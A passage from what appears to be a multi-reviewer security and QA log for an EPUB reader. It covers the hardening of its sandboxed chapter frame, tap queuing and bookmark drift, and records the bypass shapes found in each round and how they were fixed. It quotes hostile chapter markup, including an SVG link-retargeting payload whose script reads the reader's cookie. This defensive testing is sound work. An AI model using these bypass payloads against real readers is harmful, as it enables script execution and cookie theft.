  document for a same-origin document with allow-scripts + allow-same-origin and no policy. Suspicion, not built: epub.js serves
  an archived book's non-HTML assets (SVG included) as blob: URLs, which have the reader's origin; a refresh to one would be an
  unhardened same-origin document. The HTML re-parse fix for C1 closes this too (the HTML parser lowercases names).
- WARNING W2 (P2 "quick taps chain", hard part 4): taps are lost. turnAuto keeps ONE pending slot (`pending = dir`), so a tap that
  lands while a tap is already pending is overwritten. Real reader, fresh DATA_DIR per run, 10 tap-zone clicks on the right:
  every 60 ms -> 5 pages (Chromium and WebKit), every 120 ms -> 7 (Chromium) / 9 (WebKit), every 160 ms -> 10 / 9; 200 ms+ -> 10.
  Unit repro: mountEngine(); jump(0); next(); next(); next(); -> places [0,1,2] (expected [0,1,2,3]), reduced and not.
  The test "a tap while the rig repaints waits for it (quick taps chain, nothing is dropped)" calls next() only twice: its name lies.
  Fix: count pending turns (same direction adds, opposite cancels), chain them, and test three-plus taps.
- WARNING W3 (presence-not-binding, the P9 defense has no CI binding): mutants that SURVIVE the whole targeted suite (page-turn,
  books-reader-ui, books-router-nav): delete the `book.spine.hooks.content.register(... hardenChapterDocument ...)` line;
  `allowScriptedContent: true` -> false (the WebKit input fix). Only the non-CI probe would notice. Add a source lock or a jsdom test
  that the hook is registered before renderTo, and a test of the HTML round trip (C1).
- WARNING W4 (Acceptance "zero Paint events during the drag"): unmet for EPUB (Evidence: 3 Paint events on the first folded frame;
  the brief said 2 - the Evidence is the number that counts). Frame times hold (16.7 ms, 0 over 20 ms, 1.7 ms/frame). Safe to ship
  only if Dean accepts the miss explicitly; the builder cannot waive an acceptance line.
- NOTE N1 (P8 measured OK): beyond the builder's place run - 14 rapid arrow taps across a chapter, 3 rapid back, a 20% drag that
  falls back (pings 2 -> 2, saves nothing), a resize to two pages (rebuild), 3 rapid forward in two-page, and a font change (+1 and
  +2 steps): in every case the last saved locator's spineIndex and blockIndex equal the visible base page's first block, both
  engines. Page contiguity over 12 turns is clean in both engines (no skipped or repeated text) once the swap window has passed.
  A font +2 change moves the place back (branch Chromium blocks 14..17 -> 12..14, WebKit 20..22 -> 13..14); the base tree 857a2c3f
  does the same (Chromium 14..17 -> 10..12): pre-existing epub.js reflow, not a regression.
- NOTE N2 (unbound guards; behavior OK today, regression-only risk): survivors - isCurrent without `!swapAfter`, without `!T`,
  `engine.current() === viewer` in place of isCurrent; a fallback that calls onPlace (P8 "a turn that falls back saves nothing" has no
  unit test; the probe run above is the only proof); pointRig's stale-ticket check; jump not clearing swapAfter; maybeSwap during a
  turn; the post-drag click guard no-op'd; down() during a raf-less turn; setFontSize not re-parking; the chapter keydown relay; the
  walk's superseded check; the PDF first-place no-ping guard. Killed by name: canTurn present() ("a turn never starts past the end"),
  no re-point after swap (3 tests), every display() a jump (3 tests incl. "reader P8: a parked pool view..."), refresh strip /
  script strip / script-src dropped ("P9 hardenChapterDocument: the policy is the FIRST..."), relocated ungated ("reader P8..."),
  link resolve without the directory boundary ("in-book links..."), refit to {} (the v1.37.3 lock).
- NOTE N3: security-brief's APPROVED rests on "the CSP meta is the first head child in the serialized output" - true for the XML
  string, false after the frame's HTML parse (C1); and "no same-origin sink for a navigated frame" - the refresh above reaches a
  same-origin URL with scripts allowed (W1). I disagree with that approval on measurement.
- Not verified (device only): long-press selection, link taps on iOS, pointer capture when a touch drag leaves the frame.

### Fix round r1 -> r2 (builder, 2026-11-03)

Reviewed sha 439b7150; fixes in the commit that carries this section. Each r1 finding and what answers it:

- **C1 (qa, adversary) P9 bypass.** The guard moved from the XML chapter document to the MARKUP the frame parses:
  `hardenChapterMarkup` (read.js) PREPENDS the policy meta (the first bytes the HTML parser reads, so it is the first element of
  `<head>` whatever comes before the book's own head), then re-parses the chapter as HTML and drops every script, iframe, frame,
  object, embed, base, noscript and http-equiv meta, every on* attribute and every javascript: / vbscript: / data:text/html URL in
  href, src, xlink:href, action, formaction, data, srcdoc, and serializes again (no doctype, as before). Registered as a
  `book.spine.hooks.serialize` hook. **Found while fixing, measured:** epub.js registers its OWN serialize hook while the book opens
  (an archived book's blob: URL swap) and it rewrites `section.output` from the ORIGINAL markup, so a guard registered before it is
  silently undone (the first fix attempt: the frame got the book's markup untouched, the old `csp` case ran code in both engines).
  The guard is registered after `book.ready` (that hook is in place by then), runs last, and hardens `section.output` as epub.js left
  it; no page view exists before it.
  `node scripts/page-turn-probe.js csp both`: the original hostile chapter - book code that ran `[]`, policy first, 0 scripts, 0
  handlers, Chromium and WebKit; **csp shapes** (element before head; body before head; body before head with a srcdoc frame; CDATA
  before head; uppercase refresh to the app with an ONCLICK paragraph): Chromium 30 frame reads and WebKit 30 frame reads - book
  code that ran `[]`, frames without the policy first / with a script or nested frame / navigated away: 0 and 0.
  Unit: "P9 hardenChapterMarkup: after the frame's HTML parse the policy is the FIRST element of <head> for every hostile shape, and
  no code is left" (XML parse -> XMLSerializer -> the guard -> an HTML parse; 7 shapes incl. an SVG root), "an ordinary chapter keeps
  its text, structure and attributes".
- **W1 (adversary; security-brief WARNING and NOTE) case-sensitive strip.** Gone with C1: the strip runs on the HTML parse (names
  lowercased); the uppercase refresh to /robots.txt stays on about:srcdoc in both engines (csp shapes above).
- **W2 (adversary) taps lost.** `pending` is a queue (order kept, 12 max); `drain()` runs its head whenever that rig is ready and
  nothing is in flight, from every rig-ready and every new tap; a queued turn that cannot start (the book's first / last page) ends
  the queue. `taps both` (a fresh 8-chapter book per run): 10 tap-zone taps 60 / 120 / 200 ms apart -> 10 pages in Chromium and
  WebKit, run twice (12 of 12). The build's own tap loop found a tap stranded at the book's end that froze later taps; 10 end-of-book
  runs (12 taps then ArrowLeft, both engines): 0 stuck. Unit: "quick taps chain - five taps in one go land five pages, in order, none
  dropped (reduced and animated)" (also mixed directions), "a queued tap past the end ends the queue; the next tap still works
  (reduced and animated)".
- **W3 (adversary) P9 unbound.** "reader P9 wiring: the chapter guard is registered on the book before any page view exists, it
  rewrites what renders, and the views run scripts ON only under it" - the harness models epub.js's own serialize hook exactly
  (registered while the book opens, rewriting from the original markup) and runs every hook in order.
- **W (qa) P8: an unresolved Contents link moved the bookmark to page 1.** Contents entries go through `resolveBookLink` (an entry
  that names no chapter leaves the reader where it is); a jump's fallback is its chapter, and only the open (resume: true) may end
  at the book's start; a font change / relayout re-anchors with the place's chapter too. Unit: "reader P8: a Contents entry that names
  no chapter leaves the reader where it is (never the book's start)". `resolveBookLink` now prefers an exact path (qa NOTE).
- **W (qa) lying comments:** the P9 block rewritten for what the code now does; the `epubLocationReport` comment fixed; the removed
  v1.37.3 re-measure explained beside the open (pool renditions are sized to page boxes laid out from the settled pane and never
  resized; first paint is device check (j)); the PDF layout key is one constant.
- **W4 / qa NOTE (zero Paint events):** unchanged - 3 Paint events once on an EPUB's first folded frame (`frames chromium` on this
  tree: 1.63 / 1.64 ms/frame, 0 frames over 20 ms; PDF 0 Paint events, 2.63 ms/frame). Dean's call (asked).
- **N2 bound now:** the swap window ("right after a landing nothing is current until the twin rig has swapped up"), "a drag that
  falls back saves nothing (P8) and its click is swallowed". Still unbound (regression-only, behavior verified): the pointRig ticket,
  jump clearing swapAfter, maybeSwap during a turn, down() in a raf-less turn, setFontSize re-parking, the chapter keydown relay,
  the walk's superseded check, the PDF first-place no-ping guard.
- **qa NOTE ROADMAP:** the scroll column's one-page-early resume and the other follow-ups are now in ROADMAP Planned > Features.
- **security-brief NOTEs** (no default-src; `<area>` / SVG xlink links; the probe's test session) are in ROADMAP Planned (the first
  two) or need nothing (the probe is not network-reachable).

Fix-round mutants (each restored byte-identical): serialize hook gone, `allowScriptedContent` false, the guard's prefix dropped, its
drop list dropped, Contents jumping unresolved, queue order, no chain-land, stuck queue (reduced), stuck queue (animated, after the
test was extended to both modes), click guard, swap window, guard registered before `book.ready`: 12 of 12 killed by name.
Probe set on the fix tree (before the drain change; `taps` and the end-of-book loop after it): smoke PASS both; trigger 7/7 Chromium,
7/7 WebKit; landing 8/8 at 0 px; place PASS both (blockIndex 11 / 18 = the visible page's first block); reduced PASS both; pdfscroll
PASS both; link PASS both. Targeted units after the last change: `# pass 103`, `# fail 0` (page-turn, books-reader-ui,
books-router-nav, pocket-kb-search, shortcut-typing-guards); lint:ui OK (3142); overlay census clean.

Gate: CHANGES r2 @106f4b2a — security-brief

Owned first: my r1 APPROVED missed C1. I reasoned that the meta's position did not matter because the strip existed, and never
checked that the HTML parser keeps a head-placed meta in <head>. qa and the adversary measured the bypass; my W1/NOTE were the same
casing class. Static review only (no browser, no git); I read read.js and the plan as the worktree holds them for 106f4b2a.

C1 re-verified: FIXED as prescribed (static trace, consistent with the builder's two-engine probe). Hook.trigger (epub.min.js) runs
hooks synchronously in registration order. replacements() registers epub.js's own substitute hook synchronously inside unpack(),
in the same block that resolves the loading.* promises book.ready waits on, so it is in place before `await book.ready` resumes, and
the guard (read.js:625) runs LAST and reads section.output. Section.render resolves this.output after the serialize hooks;
IframeView passes that string straight to load() -> srcdoc. No renderTo exists before the registration (openEpub, read.js:600-645).
read.js never calls book.store(), so the offline-storage serialize hook is never registered. Locations/search/feed use
section.load, not render, and never reach a frame. The prepended meta is the first bytes the frame parses, so the HTML parser puts it
first in <head>, and nothing it parses later can move it. So any script-class markup that survives the parse/serialize/parse round
trip (template contents, which querySelectorAll does not enter; noscript under DOMParser's scripting-off parse; foreign-content
re-nesting) sits after an enforcing script-src 'none'. The strip is now the belt, the policy is the brace. Cache (read.js:628-633):
keyed by href, reused only when the raw markup is byte-equal. Sound. W1 and my NOTE are closed by the HTML-side strip.

WARNING (new class, plausible, NOT browser-verified; I wrongly called it contained in r1): navigation to the book's own blob:
assets. epub.js's substitute hook runs BEFORE the guard, so asset references in a chapter are already app-origin blob: URLs when
hardenChapterMarkup sees them, and the guard only filters javascript:/vbscript:/data:text/html. epub.js's link munging (a[href]
only) forces target=_blank on blob: links, which the no-popups sandbox blocks. But navigational elements it does not munge (<area
href>, SVG <a xlink:href>) keep a blob: target, and a tap navigates the frame itself. The new document is app-origin (the blob's
creator), keeps the frame's allow-same-origin allow-scripts, and is a NEW document the chapter's meta does not govern (the reader page
sends no CSP to inherit). If the asset is a document type that runs script, that is the parent compromise C1 was. It needs one tap
on a book link, which is normal reading. I traced the guard and epub.js paths statically. I did NOT run browser navigation or policy
inheritance for blob documents, so this is a strong suspicion. Prescription: in hardenChapterMarkup, remove href / xlink:href from
every `a` (any namespace) and `area` whose normalized value has any scheme except http/https/mailto (blob: and every data: included).
Leave src and SVG <image> references alone, because images need their blob: URLs. Add a probe case per element in `csp both`.
Re-verdict on that.

NOTE: fail-open. epub.js's Hook.trigger catches and only logs a hook's exception, so if hardenChapterMarkup ever threw, the
unhardened output would render with scripts on. I found no input that throws it. Hardening: wrap the guard and, on error, set
section.output to an empty policy-only document.

NOTE: still open from r1 and in ROADMAP Planned: no default-src (remote image/CSS beacons on open), and self-navigation to remote
or opaque data: documents via <area>/SVG links (cross-origin, so contained). The blob: case above is split out because it is not
cross-origin.

Gate: CHANGES r2 @106f4b2a — qa

Delta on 439b7150..106f4b2a, each r1 qa finding:
- r1 CRITICAL P9 bypass: FIXED as prescribed (prefix + HTML re-parse strip, serialize hook after book.ready). Verified,
  real server + reader (sandbox /tmp/qa-v1402-r2, qa/p9.js): body-first <SCRIPT>, body-first srcdoc frame, CDATA before
  head, head-first <SCRIPT>, CDATA img onerror, uppercase refresh: ran nothing in Chromium (all six) and WebKit
  (body-first <SCRIPT>, CDATA before head); the policy meta is the head's first element every time, the frame stays
  about:srcdoc. `page-turn-probe.js csp both`: PASS (incl. "csp shapes" 5 chapters x 30 frame reads, both engines).
  The epub.js order claim checked at source: Book.replacements() registers its serialize hook synchronously before the
  loaded.* promises' continuations run, and Section.render resolves this.output read after the hooks.
- r1 WARNING P8 TOC to page 1: FIXED. qa/toc.js (Chromium): place 1:4 saved block 14 -> tap "Chap 2" -> shows "Chap 2",
  saved {spineIndex:2, blockIndex:0}. here() now carries placeSpine; only the resume may fall back to the start.
- r1 WARNING lying comments: FIXED (the block comment now describes the markup guard).
- r1 NOTEs: epubLocationReport comment fixed; v1.37.3 removal now explained + device check (j); READER_PDF_LAYOUT_KEY
  used everywhere; resolveBookLink exact-first; ROADMAP follow-ups added (the column-one-page-early entry exists now).

NEW, introduced by the fix:
- WARNING (regression, read.js ~L622 + ~L640): `await book.ready` now runs BEFORE `book.on('openFailed', ...)` is
  subscribed. epub.js never resolves book.ready on an open failure (open().catch only emits OPEN_FAILED), so the await
  hangs and the subscription is never made: the v1.37.1 "hang at Opening book..." the comment beside it guards against.
  Verified (qa/broken.js, Chromium, the probe book overwritten with junk after the scan): 106f4b2a after 12 s shows
  "Opening book…"; the same script on 439b7150 shows "Could not open this book / The file may be damaged or not a valid
  EPUB." Fix: subscribe openFailed before the await, and race book.ready against the failure (and the abort signal).
Checked, no finding: the pending-tap queue (drain on every rig-ready and every tap; a turn that cannot start clears the
queue; PENDING_MAX 12).
Measured (Node 22.23.1): eslint 0 errors / 6 warnings (common.js, pre-existing); lint:ui OK; overlay-containment clean
(0 violations); the 5 targeted unit files: 103 tests, 103 pass, 0 fail.

Gate: CHANGES r2 @106f4b2a — adversary

Delta on 439b7150..106f4b2a. Mutants ran in a /tmp `git archive 106f4b2a` sandbox (worktree untouched); Node 22.23.1; Playwright
Chromium + WebKit; one browser probe at a time. Instruments: the 5 targeted unit files 103/103 pass; lint:ui OK; overlay-containment
clean (0); eslint on page-turn.js, read.js, the probe and the two changed tests: 0 problems. `page-turn-probe.js csp both`: PASS
(csp + csp shapes, both engines).

r1 findings:
- C1 FIXED as prescribed. My r1 e2e-csp chapter (element before head) now gives metaParent HEAD and inlineRan false in both engines.
  I widened it to 9 chapters: normal, element before head, text before head, body before head, CDATA before head, an SVG-root spine
  item, a processing instruction before head, raw-text title/style holding `</title><body>`, and an .html-extension chapter with a
  `<p>` and a doctype before `<html>`. In both engines every chapter had the policy meta as head's first element and refused the
  page-appended inline script. I checked the order claim in epub.min.js: Book.replacements() registers its serialize hook
  synchronously in unpack(), in the same block that resolves the loaded.* promises book.ready waits on. Hook.trigger runs hooks in
  order and synchronously, and Section.render resolves this.output after the hooks. No other code writes section.output except
  load/unload, and IframeView hands that string to srcdoc. Locations use section.load, not render. read.js passes no `store`, so the
  "offline" serialize hook (which would register AFTER the guard and rebuild the output from the original markup) is never
  registered. NOTE: if a store is ever added, that hook undoes the guard. Bind it with a lock.
- W1 FIXED. My uppercase-refresh / uppercase-SCRIPT chapter: the frame stays about:srcdoc in both engines and has 0 scripts.
- W2 FIXED. 10 tap-zone taps, fresh data folder per run, settle 1.5 s: 40 / 60 / 120 ms apart -> 10 / 10 / 10 pages in Chromium AND
  WebKit, end state `q0 f1 b1 s0 d0`. My r1 numbers with a 300 ms settle partly counted a queue still draining: the r1 unit repro
  (3 taps -> 2 pages) was the binding proof. The new five-taps test kills Q3, Q4 and Q6 by name.
- W3 FIXED. Deleting the serialize-hook registration, registering it before book.ready, reading the trigger's argument instead of
  section.output, dropping the prefix, and appending the meta instead of prefixing it all die by name ("reader P9 wiring: ...",
  "P9 hardenChapterMarkup: after the frame's HTML parse ..."). The iframe, noscript, javascript: and on* strips die too.
- W4: with Dean (not re-judged).

NEW, introduced by the strip (r1 started it, r2 widened it):
- WARNING N-W1 (P8, existing bookmarks move): hardenChapterMarkup REMOVES elements (script, iframe, frame, object, embed, base,
  meta[http-equiv], noscript). epub.js CFIs count element siblings by position, so a place saved by v1.401 (whose frame kept those
  elements) resolves to a different node when a removed element comes before it at the same level. The reader then saves the
  moved place over the bookmark.
  - Repro (cfishift.js): one chapter, `<h1>`, 3 paragraphs, `<noscript>n</noscript><script></script><object data="none.bin">`,
    then 30 paragraphs.
  - Base tree 857a2c3f: 4 turns save `epubcfi(/6/2!/4/64/1:0)`, block 28, showing q27, and reopening it shows q27.
  - Branch, same locator posted to /progress: the reader opens on q29 and saves `epubcfi(/6/2!/4/62/1:0)`, block 30.
  - The bookmark moved forward and the old one was overwritten. blockIndex stays consistent: Listen and the Feed count blocks, not
    removed elements.
  - Scope: books with those elements in the body flow (EPUB3 interactive, noscript fallbacks, embedded objects).
  - Fix: neutralize in place, never remove. Replace each dropped element with an inert empty element (e.g. `<span hidden>`) so every
    element index is kept. The prepended policy is the defense either way. Add a test that the element count at each level is the
    same before and after hardening.
- NOTE: unbound guards on the r2 code paths (behavior correct today). Survivors: Q17, where any jump may fall back to the book's start
  instead of only the resume. That is the data path qa's r1 TOC finding was about. Only a TOC entry that resolves to nothing is
  bound, not a refused CFI from a font change or rebuild. Also: Q18 here() dropping placeSpine; Q2 a tap not calling drain()
  (rig-ready also drains); Q15 the cache reusing a hit without the raw compare. Q20 is an equivalent mutant (attr.name is already
  lowercase in an HTML document).
- Agreed with, not re-measured by me: qa's openFailed hang (await book.ready before the openFailed subscription) and security-brief's
  blob: navigation suspicion (<area>/SVG xlink:href to the book's own app-origin assets). I did not build the navigation case.

### Fix round r2 -> r3 (builder, 2026-11-03)

**Dean's ruling on the Paint acceptance line (AskUserQuestion, 2026-11-03): "Ship, disclosed"** - the EPUB's one burst of 3 Paint
events on a turn's first folded frame is accepted (frames hold 16.7 ms, 0 over 20 ms, ~1.7 ms/frame; PDF 0; the approved prototype 42);
it stays a ROADMAP follow-up.

Reviewed sha 106f4b2a (every r1 finding confirmed fixed by all three seats); the three new r2 findings, answered in the commit that
carries this section:

- **qa WARNING, damaged EPUB hangs on "Opening book".** `openFailed` is subscribed before the wait, and the wait races `book.ready`,
  the failure and the view's abort; a failed open shows the error state and builds no page view. Unit: "reader: a damaged book
  (epub.js openFailed; book.ready never settles) shows the error state, never a stuck 'Opening book'". Probe `broken both` (the
  file overwritten with junk after the scan): "Could not open this book" after 8 s in Chromium and WebKit.
- **adversary WARNING, places saved by v1.401 move.** Dropped elements are NEUTRALIZED in place (an empty `<template>`, inert, valid
  in head and body, never moved by the HTML parser): every kept element keeps its index and child count at every level. Unit:
  "neutralized elements keep every sibling count, so places saved before v1.402 still land" (against the frame v1.401 built from
  the same chapter). Disclosed: a place saved INSIDE a `<noscript>`'s content cannot land (its children are gone).
- **security-brief WARNING, a link to the book's own file.** A link (HTML `<a>`, `<area>`, SVG `<a>`, `href` and `xlink:href`) keeps
  only http(s), mailto and a relative chapter path. Unit: "links keep http(s), mailto and relative chapter paths; blob:, data: and
  other schemes go". Probe `csp both`, new shape "links to the book's own scripted SVG" (an `<area>`, an SVG `<a>` and an `<a>`
  to the book's SVG that carries a script; every link clicked): 6 shapes, 36 frame reads per engine, book code that ran `[]`, 0 frames
  navigated away, Chromium and WebKit. **The probe sees the attack:** with the link filter disabled the same run reads 18 (Chromium) /
  30 (WebKit) frames navigated to `blob:http://...` and in WebKit the SVG's script RAN (`["blob-svg" x6]`) - the r2 suspicion was a
  real same-origin compromise path.
- **security-brief NOTE, fails open.** The guard's call is wrapped: a throw renders an empty page under the policy.
- **adversary NOTE Q17/Q18.** "reader P8: a re-anchor epub.js refuses (font change) falls back to the place's CHAPTER, never the
  book's start".

Mutants (restored byte-identical each): remove instead of neutralize, links unfiltered, ready not raced, no chapter fallback, `here()`
without the chapter: 5 of 5 killed by name. Targeted units: page-turn + books-reader-ui `# pass 54`, `# fail 0`.
Probe set on this tree: smoke, trigger (7/7 x2), landing (8/8 at 0 px), place, reduced, taps (10/10/10 x2 engines), pdfscroll, link,
csp, broken: all PASS; frames: EPUB 1.68 / 1.73 ms/frame, 0 over 20 ms, 3 Paint events (accepted above), PDF unchanged.

Gate: CHANGES r3 @a202ab11 — security-brief

Static review only (no browser, no git), of read.js and this plan as the worktree holds them.

r2 WARNING (links to the book's own blob: files): FIXED as prescribed for links the guard can SEE (read.js:136-149). The builder's
probe with the filter disabled confirmed the path was real.
r2 NOTE (fails open): FIXED. The call is wrapped and a throw renders a policy-only blank page (read.js:653).
Template neutralization itself: SAFE. read.js:134 builds a NEW template with doc.createElement, with no attributes and no content,
so the replacement carries nothing.

WARNING (blocking; traced statically, NOT browser-verified): the guard does not reach a BOOK-supplied <template>'s content.
querySelectorAll does not enter template.content, so links and attributes inside a book's own template are never filtered. Content
there is normally inert, but a template carrying a shadowrootmode attribute becomes a live declarative shadow root when the frame's
HTML parser builds the page. DOMParser.parseFromString does not attach declarative shadow roots, so the guard sees an inert
template, while Chromium and WebKit's document parser do attach them. Script stays blocked by the first-in-head policy, but the r2 link
filter is bypassed for anything inside, which re-opens the r2 class through one more wrapper. Prescription: neutralize every
book-supplied template exactly like the drop list (an empty, attribute-less template in place), or walk template.content
recursively with the same rules AND remove shadowrootmode / shadowrootclonable / shadowrootdelegatesfocus. Add a probe shape for
it in `csp both`, and run the filter-disabled control to show the probe sees it.

WARNING (blocking until probed; suspicion): SVG animation elements (animate / set) can change an attribute after load. The guard
checks the static href / xlink:href on a/area, but not an animation that targets those attributes. Whether either engine lets an
animation retarget an SVG link's href to a blob: URL is unverified here. Prescription: neutralize SVG animate / set /
animateMotion / animateTransform whose attributeName is href or xlink:href (or every animation element whose parent is a link), and
add a probe shape.

NOTE: <a ping> sends a background request to any URL on a link tap (a beacon, cross-origin, no document load). It is in the same class
as the existing no-default-src NOTE (ROADMAP). Optionally drop the ping attribute.
NOTE: <use> referencing a blob: SVG renders it as a shadow tree with no script execution (by spec), and no navigation follows. <form>
is blocked by the sandbox (no allow-forms) and form-action 'none'. meta[http-equiv] is neutralized. Nothing further for these.

Gate pacing: this is round 3; per Dean's norm the coordinator asks Dean before a round 4.

Gate: CHANGES r3 @a202ab11 — qa

- r2 WARNING (a damaged EPUB hung on "Opening book…"): FIXED. qa/broken.js (sandbox /tmp/qa-v1402-r3, the probe book
  overwritten with junk after the scan), after 12 s: Chromium AND WebKit "Could not open this book / The file may be damaged
  or not a valid EPUB." The race was checked from the code: an abort before ready makes the abort promise resolve at once
  and the open returns null; a nav away mid-open aborts the same way and sets no status. The error is drawn once (L641; the
  later openFailed subscription at L661 is reached only after a successful open).
- CRITICAL (NEW, verified; the security-brief r3 suspicion about SVG animation, confirmed in a browser):
  an SVG animation retargets a link to the book's own blob: HTML file after the link filter has run, and one tap runs book
  code same-origin in WebKit. qa/blobnav.js: the chapter has `<svg><a id="sa"><set attributeName="href" to="p.html"/>
  <rect/><text>Tap</text></a></svg>`, and the manifest has `p.html` (media-type image/png; epub.js picks the blob type from
  the file NAME, so it is text/html) holding `<script>top.__pwned=..;top.__cookie=top.document.cookie</script>`. epub.js's
  substitute rewrites `to="p.html"` to `blob:http://<app>/<uuid>` (seen in the frame: animVal is the blob: URL). One real
  mouse click on the link: WebKit pwned ["blob-nav"] and read the reader's cookie; the frame location is blob:, text/html,
  with 1 script. Chromium navigated the frame to the same blob: document too, and only its policy inheritance stopped the
  script. Fix: neutralize SVG animate / set (and animateMotion / animateTransform) whose attributeName is href or
  xlink:href (case-insensitive, trimmed), or every animation element inside a link, the same way as the drop list. Better
  still, also drop any attribute value that names a blob: URL outside src-type attributes (epub.js substitutes in the
  markup TEXT, so it reaches every attribute). Then add this chapter to `csp both` with a filter-disabled control.
- The security-brief's template / shadowrootmode WARNING is the same class (a link the guard cannot see); I did not probe it.
- NOTE: the open returns null on abort or failure without book.destroy() (the open book and its archive stay referenced
  until GC; this pattern was already there for the waitForPaneSize abort).
Checked, no finding: neutralizing with an empty <template> (attribute-less, created fresh, keeps sibling counts); the
static link-scheme filter (in-book links still work: `link both` PASS, Chromium 1:0 -> 2:0 "Part three", WebKit the same);
failing closed; the r1 P9 payloads re-run on a202ab11 (body-first srcdoc, body-first SCRIPT, uppercase refresh: ran
nothing, Chromium).
Measured (Node 22.23.1): eslint 0 errors / 6 warnings (common.js, already there); lint:ui OK; overlay-containment clean (0
violations); the 5 targeted unit files: 107 tests, 107 pass, 0 fail.

Gate: CHANGES r3 @a202ab11 — adversary

Delta on 106f4b2a..a202ab11. Mutants ran in a /tmp `git archive a202ab11` sandbox (worktree untouched); Node 22.23.1; Playwright
Chromium + WebKit; one browser probe at a time. The 5 targeted unit files: 107/107 pass. `page-turn-probe.js csp both`: PASS (6 shapes).
`broken both`: PASS ("Could not open this book" after 8 s in both engines).

r2 findings:
- N-W1 (a v1.401 place moves): FIXED for the CFI. With cfishift.js, the v1.401 locator `/4/64/1:0` (q27, saved by the base tree
  857a2c3f) opens on the branch with q27 on the visible page (the page shows q21..q28). The frame keeps q27 at body child 31, with
  the three neutralized elements as `<template>` at the same positions. The re-save is that page's start (`/4/52/1:82`). That is
  epub.js's normal page-start save under this reader's page size (the branch page holds 8 paragraphs, the v1.401 page 6), not the
  shift: the branch's own saved place round-trips exactly (`/4/68` -> `/4/68`). In jsdom, the element count at every level matches
  the v1.401 frame for script in SVG and MathML, object fostered out of a table, script in a tr, iframe and script in select, embed
  in p, base/meta in body, foreignObject iframe, and a book's own template. It differs only INSIDE a neutralized element; see the
  new WARNING. The R1 mutant (remove instead of neutralize) dies by name.
- NOTE Q17/Q18: Q18 is now bound (dies on "reader P8: a re-anchor epub.js refuses ..."). Q17 still SURVIVES: "any jump falls back to
  the book's start" passes the suite, because the new test always has a usable spine and so never reaches the start fallback. The
  fix-round claim "Q17 bound" does not hold. Bind it with a refused CFI and no spine (or a refused spine) on a non-resume jump.
- Q2 and Q15: still unbound (NOTE, as in r2).

NEW:
- WARNING (P8 / the Listen-from-here and Feed bridge; fixed in neither r2 nor r3): blocks inside a neutralized `<noscript>` or an
  `<object>` fallback vanish from the frame, so the frame's blockIndex no longer matches the server chunker's
  (lib/books/tts-chunk.js counts them, as v1.401's no-scripts frame did).
  - Real reader, chapter `<h1>H</h1><p>q0</p><noscript><p>n1</p><p>n2</p></noscript><object data="clip.mp4"
    type="video/mp4"><p>fallback</p></object><p>q1</p><p>q2</p>`:
  - v1.401 (857a2c3f), Chromium AND WebKit: frame blocks `H|q0|n1|n2|fallback|q1|q2`, q2 = 6, server = 6.
  - a202ab11, both engines: frame blocks `H|q0|q1|q2`, q2 = 3, server = 6.
  - Effect: after such an element, Listen from here starts narration 3 blocks EARLIER than the visible page, and a Feed-moved place
    (feedBlock) opens 3 blocks LATER. The text v1.401 showed (the noscript text in a no-scripts frame, an object's fallback) is gone.
  - Fix: neutralize the element, not its children. Replace noscript/object/embed with an inert container that KEEPS the children
    (e.g. a `<span>` carrying the original children), and keep `<template>` only for elements with no element children
    (script, base, meta, iframe/frame, whose HTML content is text). Add a test that READER_BLOCK_SELECTOR counts match
    chunkChapter for these shapes.
- NOTE: unbound new guards. The fail-closed catch (R6, replaced with `out = raw`) and the abort leg of the open race (R8) both survive
  the suite. R7/R9 (openFailed race and its error state) and R2-R5 (each part of the link filter) die by name.
- NOTE (checked, no finding): `<math><mrow href="/robots.txt">` is kept by the link filter, but a click does not navigate the chapter
  frame in either engine (Chromium 1234, WebKit 2248).
- Agreed, not reproduced by me: qa's r3 CRITICAL (an SVG `<set attributeName="href">` retargets a link to the book's own blob: file
  after the filter; one tap ran book code in WebKit) and security-brief's book-template / shadowrootmode WARNING. Both are the same
  class: link values the static filter cannot see. qa's "drop any blob: value outside src-type attributes" is the more general
  close. The probe should keep a filter-disabled control for each shape.

### Fix round r3 -> r4 (builder, 2026-11-04)

Reviewed sha a202ab11 (Dean approved round 3). Every r2 finding confirmed fixed (qa: the damaged book; adversary: the bookmark shift;
security-brief: blob: links and fail-closed). New r3 findings, answered in the commit that carries this section:

- **qa CRITICAL (confirmed in WebKit) + security-brief W2: an SVG `<set attributeName="href">` points a link at the book's own HTML
  file (a same-origin blob: page) after the markup filter; one tap ran book code. security-brief W1: a book's own `<template
  shadowrootmode>` becomes live content the filter never saw.** Answered structurally, in two independent layers:
  1. **The navigation backstop:** a capture-phase click listener in every chapter cancels the browser's own navigation for any link
     (`<a>` / `<area>`, any namespace, found through `composedPath`, so shadow roots too). In-book links still work (epub.js's own
     handler routes them through display(), the pool jump). Bound: "reader P9 backstop: a tap on ANY link in a chapter never
     navigates the frame (an SVG link, a link inside a shadow root)" (drives the real chapter hook on a real frame; red with the
     backstop removed).
  2. **The markup:** a book's own `<template>` and every SVG animation element (animate, set, animateMotion, animateTransform,
     animateColor, discard) become an empty `<template>`; `ping` goes. Bound: "a book's own <template> (shadowrootmode) and SVG
     animations are emptied; ping goes".
  `csp both` with two new shapes ("an animated link to the book's own page", "a shadow-root link to the book's own page"): 8 hostile
  chapters, 48 frame reads per engine, book code that ran `[]`, 0 frames navigated, Chromium and WebKit. **Controls:** backstop ONLY
  (template / animation neutralization and the link filter disabled): still 0 and 0 in both engines - the backstop holds every
  shape alone. Neither layer: Chromium 30 frames navigated away; WebKit 30 navigated and the book page's script ran
  (`["blob-page" x8]`) - the probe sees the attack.
- **adversary WARNING: paragraphs inside a neutralized `<noscript>` / `<object>` vanished** (the server chunker still counts them, so
  Listen from here and Feed places were off by those blocks; v1.401's scripts-off frame showed them). noscript / object / embed now
  become a `<span>` that KEEPS its children (an object loads nothing under `object-src 'none'`). Bound: "a chapter's blocks in the
  frame are the server chunker's blocks" (frame `H|q0|n1|n2|fallback|q1|q2|q3` = `chunkChapterDetailed`).
- **adversary NOTEs:** Q17 bound ("a refused re-anchor with no chapter to fall back to never shows the book's start"); the open's abort
  leg bound ("leaving while the book is still opening ends the open and frees the book"); fail-closed bound ("the guard fails CLOSED").
- **qa NOTE:** a failed or aborted open destroys the book.
- **security-brief NOTE `<a ping>`:** removed (above).

Mutants (restored byte-identical each): keep-children off, a book's template kept, animations kept, ping kept, fails open, no abort
leg, any jump to the book's start, the backstop removed: 8 of 8 killed by name. Targeted units (page-turn, books-reader-ui,
books-router-nav, pocket-kb-search, shortcut-typing-guards, books-tts-chunk): `# pass 124`, `# fail 0`. lint:ui OK; overlay census
